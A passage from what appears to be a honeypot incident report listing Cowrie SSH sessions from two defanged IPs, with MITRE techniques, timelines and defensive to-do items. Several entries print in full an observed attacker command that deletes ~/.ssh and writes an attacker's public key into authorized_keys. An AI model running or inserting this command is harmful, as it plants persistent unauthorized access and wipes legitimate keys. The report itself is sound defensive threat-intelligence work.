| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:19:50` | `cowrie.session.connect` |
| `2026-04-25 11:19:50` | `cowrie.client.version` |
| `2026-04-25 11:19:50` | `cowrie.client.kex` |
| `2026-04-25 11:19:50` | `cowrie.login.success` |
| `2026-04-25 11:19:51` | `cowrie.session.params` |
| `2026-04-25 11:19:51` | `cowrie.command.input` |
| `2026-04-25 11:19:51` | `cowrie.command.failed` |
| `2026-04-25 11:19:51` | `cowrie.log.closed` |
| `2026-04-25 11:19:51` | `cowrie.session.params` |
| `2026-04-25 11:19:51` | `cowrie.command.input` |
| `2026-04-25 11:19:51` | `cowrie.session.file_download` |
| `2026-04-25 11:19:51` | `cowrie.log.closed` |
| `2026-04-25 11:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395745d4b5a7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:19 |
| **Last Seen** | 2026-04-25 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:19:53` | `cowrie.session.connect` |
| `2026-04-25 11:19:53` | `cowrie.client.version` |
| `2026-04-25 11:19:53` | `cowrie.client.kex` |
| `2026-04-25 11:19:53` | `cowrie.login.success` |
| `2026-04-25 11:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0b245f8628

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:22 |
| **Last Seen** | 2026-04-25 11:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:22:18` | `cowrie.session.connect` |
| `2026-04-25 11:22:18` | `cowrie.client.version` |
| `2026-04-25 11:22:18` | `cowrie.client.kex` |
| `2026-04-25 11:22:20` | `cowrie.login.success` |
| `2026-04-25 11:22:20` | `cowrie.session.params` |
| `2026-04-25 11:22:20` | `cowrie.command.input` |
| `2026-04-25 11:22:20` | `cowrie.command.failed` |
| `2026-04-25 11:22:21` | `cowrie.log.closed` |
| `2026-04-25 11:22:21` | `cowrie.session.params` |
| `2026-04-25 11:22:21` | `cowrie.command.input` |
| `2026-04-25 11:22:22` | `cowrie.session.file_download` |
| `2026-04-25 11:22:22` | `cowrie.log.closed` |
| `2026-04-25 11:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd049f7cbe02

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:22 |
| **Last Seen** | 2026-04-25 11:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:22:25` | `cowrie.session.connect` |
| `2026-04-25 11:22:25` | `cowrie.client.version` |
| `2026-04-25 11:22:25` | `cowrie.client.kex` |
| `2026-04-25 11:22:27` | `cowrie.login.success` |
| `2026-04-25 11:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4689bfeb34

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:25 |
| **Last Seen** | 2026-04-25 11:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:25:03` | `cowrie.session.connect` |
| `2026-04-25 11:25:03` | `cowrie.client.version` |
| `2026-04-25 11:25:03` | `cowrie.client.kex` |
| `2026-04-25 11:25:04` | `cowrie.login.success` |
| `2026-04-25 11:25:05` | `cowrie.session.params` |
| `2026-04-25 11:25:05` | `cowrie.command.input` |
| `2026-04-25 11:25:05` | `cowrie.command.failed` |
| `2026-04-25 11:25:05` | `cowrie.log.closed` |
| `2026-04-25 11:25:06` | `cowrie.session.params` |
| `2026-04-25 11:25:06` | `cowrie.command.input` |
| `2026-04-25 11:25:06` | `cowrie.session.file_download` |
| `2026-04-25 11:25:06` | `cowrie.log.closed` |
| `2026-04-25 11:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1f49f744662

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:25 |
| **Last Seen** | 2026-04-25 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:25:10` | `cowrie.session.connect` |
| `2026-04-25 11:25:10` | `cowrie.client.version` |
| `2026-04-25 11:25:10` | `cowrie.client.kex` |
| `2026-04-25 11:25:11` | `cowrie.login.success` |
| `2026-04-25 11:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da5d262510c

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:25 |
| **Last Seen** | 2026-04-25 11:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:25:56` | `cowrie.session.connect` |
| `2026-04-25 11:25:56` | `cowrie.client.version` |
| `2026-04-25 11:25:56` | `cowrie.client.kex` |
| `2026-04-25 11:25:57` | `cowrie.login.success` |
| `2026-04-25 11:25:58` | `cowrie.session.params` |
| `2026-04-25 11:25:58` | `cowrie.command.input` |
| `2026-04-25 11:25:58` | `cowrie.command.failed` |
| `2026-04-25 11:25:58` | `cowrie.log.closed` |
| `2026-04-25 11:25:59` | `cowrie.session.params` |
| `2026-04-25 11:25:59` | `cowrie.command.input` |
| `2026-04-25 11:25:59` | `cowrie.session.file_download` |
| `2026-04-25 11:25:59` | `cowrie.log.closed` |
| `2026-04-25 11:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4325ff702b

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:26 |
| **Last Seen** | 2026-04-25 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:26:03` | `cowrie.session.connect` |
| `2026-04-25 11:26:03` | `cowrie.client.version` |
| `2026-04-25 11:26:03` | `cowrie.client.kex` |
| `2026-04-25 11:26:04` | `cowrie.login.success` |
| `2026-04-25 11:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e23d4ee84f49

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:27 |
| **Last Seen** | 2026-04-25 11:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:27:38` | `cowrie.session.connect` |
| `2026-04-25 11:27:38` | `cowrie.client.version` |
| `2026-04-25 11:27:39` | `cowrie.client.kex` |
| `2026-04-25 11:27:40` | `cowrie.login.success` |
| `2026-04-25 11:27:41` | `cowrie.session.params` |
| `2026-04-25 11:27:41` | `cowrie.command.input` |
| `2026-04-25 11:27:41` | `cowrie.command.failed` |
| `2026-04-25 11:27:41` | `cowrie.log.closed` |
| `2026-04-25 11:27:42` | `cowrie.session.params` |
| `2026-04-25 11:27:42` | `cowrie.command.input` |
| `2026-04-25 11:27:42` | `cowrie.session.file_download` |
| `2026-04-25 11:27:42` | `cowrie.log.closed` |
| `2026-04-25 11:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19f7fb0f167

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-04-25 11:27 |
| **Last Seen** | 2026-04-25 11:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:27:45` | `cowrie.session.connect` |
| `2026-04-25 11:27:45` | `cowrie.client.version` |
| `2026-04-25 11:27:46` | `cowrie.client.kex` |
| `2026-04-25 11:27:47` | `cowrie.login.success` |
| `2026-04-25 11:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1106d1d1e86

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:30 |
| **Last Seen** | 2026-04-25 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:30:32` | `cowrie.session.connect` |
| `2026-04-25 11:30:32` | `cowrie.client.version` |
| `2026-04-25 11:30:32` | `cowrie.client.kex` |
| `2026-04-25 11:30:33` | `cowrie.login.success` |
| `2026-04-25 11:30:33` | `cowrie.session.params` |
| `2026-04-25 11:30:33` | `cowrie.command.input` |
| `2026-04-25 11:30:33` | `cowrie.command.failed` |
| `2026-04-25 11:30:33` | `cowrie.log.closed` |
| `2026-04-25 11:30:33` | `cowrie.session.params` |
| `2026-04-25 11:30:33` | `cowrie.command.input` |
| `2026-04-25 11:30:33` | `cowrie.session.file_download` |
| `2026-04-25 11:30:33` | `cowrie.log.closed` |
| `2026-04-25 11:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdff46b2b809

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:30 |
| **Last Seen** | 2026-04-25 11:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:30:35` | `cowrie.session.connect` |
| `2026-04-25 11:30:35` | `cowrie.client.version` |
| `2026-04-25 11:30:35` | `cowrie.client.kex` |
| `2026-04-25 11:30:36` | `cowrie.login.success` |
| `2026-04-25 11:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da236eff7311

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:31 |
| **Last Seen** | 2026-04-25 11:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:31:30` | `cowrie.session.connect` |
| `2026-04-25 11:31:30` | `cowrie.client.version` |
| `2026-04-25 11:31:30` | `cowrie.client.kex` |
| `2026-04-25 11:31:31` | `cowrie.login.success` |
| `2026-04-25 11:31:31` | `cowrie.session.params` |
| `2026-04-25 11:31:31` | `cowrie.command.input` |
| `2026-04-25 11:31:31` | `cowrie.command.failed` |
| `2026-04-25 11:31:31` | `cowrie.log.closed` |
| `2026-04-25 11:31:31` | `cowrie.session.params` |
| `2026-04-25 11:31:31` | `cowrie.command.input` |
| `2026-04-25 11:31:31` | `cowrie.session.file_download` |
| `2026-04-25 11:31:31` | `cowrie.log.closed` |
| `2026-04-25 11:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af2ef43d375

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:31 |
| **Last Seen** | 2026-04-25 11:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:31:33` | `cowrie.session.connect` |
| `2026-04-25 11:31:33` | `cowrie.client.version` |
| `2026-04-25 11:31:33` | `cowrie.client.kex` |
| `2026-04-25 11:31:34` | `cowrie.login.success` |
| `2026-04-25 11:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fbd845c3500

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:32 |
| **Last Seen** | 2026-04-25 11:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:32:30` | `cowrie.session.connect` |
| `2026-04-25 11:32:30` | `cowrie.client.version` |
| `2026-04-25 11:32:30` | `cowrie.client.kex` |
| `2026-04-25 11:32:30` | `cowrie.login.success` |
| `2026-04-25 11:32:31` | `cowrie.session.params` |
| `2026-04-25 11:32:31` | `cowrie.command.input` |
| `2026-04-25 11:32:31` | `cowrie.command.failed` |
| `2026-04-25 11:32:31` | `cowrie.log.closed` |
| `2026-04-25 11:32:31` | `cowrie.session.params` |
| `2026-04-25 11:32:31` | `cowrie.command.input` |
| `2026-04-25 11:32:31` | `cowrie.session.file_download` |
| `2026-04-25 11:32:31` | `cowrie.log.closed` |
| `2026-04-25 11:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a39d28a564e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:32 |
| **Last Seen** | 2026-04-25 11:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:32:33` | `cowrie.session.connect` |
| `2026-04-25 11:32:33` | `cowrie.client.version` |
| `2026-04-25 11:32:33` | `cowrie.client.kex` |
| `2026-04-25 11:32:34` | `cowrie.login.success` |
| `2026-04-25 11:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1f0e3b36d0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-04-25 11:33 |
| **Last Seen** | 2026-04-25 11:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 11:33:30` | `cowrie.session.connect` |
| `2026-04-25 11:33:30` | `cowrie.client.version` |
| `2026-04-25 11:33:30` | `cowrie.client.kex` |
| `2026-04-25 11:33:30` | `cowrie.login.success` |
| `2026-04-25 11:33:30` | `cowrie.session.params` |
| `2026-04-25 11:33:30` | `cowrie.command.input` |
